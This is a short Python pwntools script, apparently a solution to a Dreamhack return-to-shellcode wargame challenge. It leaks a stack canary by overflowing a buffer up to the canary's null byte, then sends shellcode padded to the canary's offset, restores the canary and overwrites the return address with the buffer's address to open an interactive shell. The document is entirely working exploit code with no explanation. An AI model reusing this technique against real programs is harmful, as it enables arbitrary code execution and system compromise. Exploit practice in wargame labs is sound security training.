#!/usr/bin/env python3
# Name: r2s.py
from pwn import *
from pwn import u64, p64

def slog(n, m):
    return success(': '.join([n, hex(m)]))

r = process('./r2s_nx')
# r = remote("host3.dreamhack.games", 10877)

context.arch = 'amd64'

# [1] Get information about buf
r.recvuntil(b'buf: ')
buf = int(r.recvline()[:-1], 16)
slog('Address of buf', buf)

r.recvuntil(b'$rbp: ')
buf2sfp = int(r.recvline().split()[0])
buf2cnry = buf2sfp - 8
slog('buf <=> sfp', buf2sfp)
slog('buf <=> canary', buf2cnry)

# [2] Leak canary value
payload = b'A'*(buf2cnry + 1) # (+1) because of the first null-byte

r.sendafter(b'Input:', payload)
r.recvuntil(payload)
cnry = u64(b'\x00'+r.recvn(7))
slog('Canary', cnry)

# [3] Exploit
sh = asm(shellcraft.sh())
payload = sh.ljust(buf2cnry, b'A') + p64(cnry) + b'B'*0x8 + p64(buf)
# gets() receives input until '\n' is received
r.sendlineafter(b'Input:', payload)

r.interactive()